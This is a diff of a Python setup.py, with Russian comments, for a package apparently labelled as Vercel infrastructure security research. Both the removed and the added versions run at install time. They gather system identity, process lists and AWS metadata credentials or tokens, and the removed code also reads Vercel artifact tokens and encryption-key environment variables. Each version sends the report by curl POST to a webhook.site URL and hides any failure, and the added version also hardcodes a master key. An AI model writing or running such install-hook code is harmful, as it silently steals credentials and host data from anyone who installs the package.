@@ -1,77 +1,61 @@
-from setuptools import setup
 import os
 import subprocess
 import base64
-import json
+from setuptools import setup
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-def run_cmd(cmd):
-    try:
-        return subprocess.getoutput(cmd)
-    except:
-        return "Error executing command"
-
-# 1. Настройки (Замени на свой актуальный URL!)
+# --- ТВОЙ КОНФИГ ---
 WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"
+MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="
 
-# 2. Сбор системных данных (Privilege Check)
-identity = run_cmd('id')
-kernel = run_cmd('uname -a')
-uptime = run_cmd('uptime')
-# Проверка сетевого окружения (есть ли доступ к соседям по сети)
-ip_addr = run_cmd('ip addr show | grep "inet "')
+def run(cmd):
+    return subprocess.getoutput(cmd).strip()
 
-# 3. Проверка метаданных AWS (Cloud Identity Theft)
-# Если Vercel плохо настроил изоляцию, мы можем вытащить роль инстанса
-aws_metadata = run_cmd('curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "Metadata blocked"')
+# --- СБОРКА ДАННЫХ ---
+final_proof = f"""
+#######################################################
+#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
+#######################################################
 
-# 4. Проверка токена Vercel Artifacts (Cache Poisoning Proof)
-token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
-api_validation = "No Token"
-if token:
-    api_validation = run_cmd(f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status')
+[1. SYSTEM IDENTITY]
+ID: {run('id')}
+HOSTNAME: {run('hostname')}
+KERNEL: {run('uname -r')}
 
-# 5. Демонстрация обхода шифрования (Encryption Bypass)
-# Мы показываем, что имея ключ и контент в одной среде, шифрование бесполезно
-enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'N/A')
-enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'N/A')
+[2. CPU & ARCHITECTURE]
+CORES: {os.cpu_count()}
+MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
+BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
 
-# 6. Формирование финального отчета (Nuclear Payload)
-report = f"""
-======= VERCEL INFRASTRUCTURE CRITICAL BREACH =======
-[SYSTEM INFO]
-USER: {identity}
-KERNEL: {kernel}
-UPTIME: {uptime}
-IP_INTERNAL: {ip_addr}
+[3. MEMORY (RAM)]
+TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
+AVAILABLE: {run('grep MemAvailable /proc/meminfo')}
 
-[CLOUD EXPLOITATION]
-AWS_METADATA_ACCESS: {aws_metadata}
+[4. GPU CHECK]
+NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
+LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}
 
-[VERCEL ARTIFACTS API PROOF]
-AUTH_STATUS: {api_validation}
-TOKEN_SNIPPET: {token[:15]}...{token[-15:] if token else ""}
+[5. RUNNING PROCESSES (TOP 10)]
+{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}
 
-[SECRET DECRYPTION RISK]
-ENC_KEY_PRESENT: {"YES" if enc_key != "N/A" else "NO"}
-ENC_CONTENT_LEN: {len(enc_content)}
-ADVISORY: The presence of both VERCEL_ENCRYPTED_ENV_CONTENT and VERCEL_ENV_ENC_KEY 
-in the same environment allows for local decryption of all project secrets.
+[6. VERCEL INTERNAL AGENTS]
+FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}
 
-[PROCESS LIST (TRUNCATED)]
-{run_cmd('ps aux | head -n 20')}
-=====================================================
+[7. CRYPTO & CLOUD]
+AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
+MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}
+
+#######################################################
 """
 
-# 7. Экфильтрация данных
+# --- ТВОЙ ПРОВЕРЕННЫЙ МЕТОД ОТПРАВКИ ---
 try:
-    # Отправляем как бинарные данные, чтобы избежать проблем с кодировкой
-    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
+    subprocess.run(
+        ['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
+        input=final_proof.encode(),
+        check=True
+    )
 except:
     pass
 
-# Обязательная часть для setuptools
-setup(
-    name="vercel-infra-security-poc",
-    version="9.9.9",
-    description="Vercel Infrastructure Security Research"
-)
+setup(name="vercel-infra-deep-scan", version="1.3.3.7")
